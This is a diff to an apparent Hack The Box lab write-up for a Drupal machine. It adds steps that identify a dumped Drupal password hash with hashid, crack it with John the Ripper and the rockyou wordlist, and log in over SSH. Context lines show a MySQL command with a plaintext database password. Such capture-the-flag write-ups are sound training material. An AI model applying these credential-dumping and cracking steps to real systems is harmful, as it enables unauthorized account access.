@@ -146,3 +146,22 @@ mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
 ```shell
 Creds: brucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
 ```
+
+## Crack Hash
+```shell
+root@kali# hashid '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
+Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
+
+root@kali# echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash.txt
+```
+
+```shell
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f117cef3-9ef1-4107-a71b-7d576b6ffe0c)
+
+## Initial Foothold
+```shell
+ssh brucetherealadmin@10.10.10.233
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/895a58dc-0c2b-45f1-a0a9-a944be595775)
